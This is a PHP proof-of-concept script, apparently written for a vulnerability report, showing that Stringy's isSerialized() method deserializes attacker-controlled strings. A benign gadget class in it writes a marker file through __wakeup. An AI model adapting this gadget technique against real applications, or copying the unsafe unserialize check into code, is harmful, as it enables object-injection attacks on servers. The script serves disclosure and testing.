<?php
/**
 * Standalone PoC for danielstjules/Stringy::isSerialized() unsafe PHP object deserialization.
 *
 * The target source method is:
 *   public function isSerialized() {
 *       return $this->str === 'b:0;' || @unserialize($this->str) !== false;
 *   }
 *
 * This PoC demonstrates that calling a boolean-looking serialization checker on an
 * attacker-controlled string instantiates attacker-selected PHP objects and invokes
 * magic methods while only checking whether the string is serialized.
 */

// The packed upstream Stringy source requires mb_internal_encoding() in the constructor.
// Some minimal PHP CLI images do not enable mbstring. The vulnerable method itself does
// not require mbstring, so define a compatibility shim only when the extension is absent.
if (!function_exists('mb_internal_encoding')) {
    function mb_internal_encoding($encoding = null) {
        return $encoding ?: 'UTF-8';
    }
}

require __DIR__ . '/target-src/src/Stringy.php';

class InvAuditWakeupGadget
{
    public function __wakeup(): void
    {
        file_put_contents('/tmp/stringy_isserialized_marker', 'magic method executed');
    }
}

@unlink('/tmp/stringy_isserialized_marker');

$attackerControlledPayload = serialize(new InvAuditWakeupGadget());

// A typical consumer-side pattern: a user-controlled string is wrapped in Stringy and
// the developer calls isSerialized() as a predicate/validator.
$stringy = Stringy\Stringy::create($attackerControlledPayload, 'UTF-8');
$result = $stringy->isSerialized();

printf("Payload: %s\n", $attackerControlledPayload);
printf("Stringy::isSerialized() returned: %s\n", $result ? 'true' : 'false');

if (file_exists('/tmp/stringy_isserialized_marker')) {
    echo "[VULNERABLE] __wakeup executed during isSerialized() check.\n";
    echo "Impact: the API performs PHP object deserialization instead of a side-effect-free format check.\n";
    exit(0);
}

echo "[SAFE] Marker was not created.\n";
exit(1);
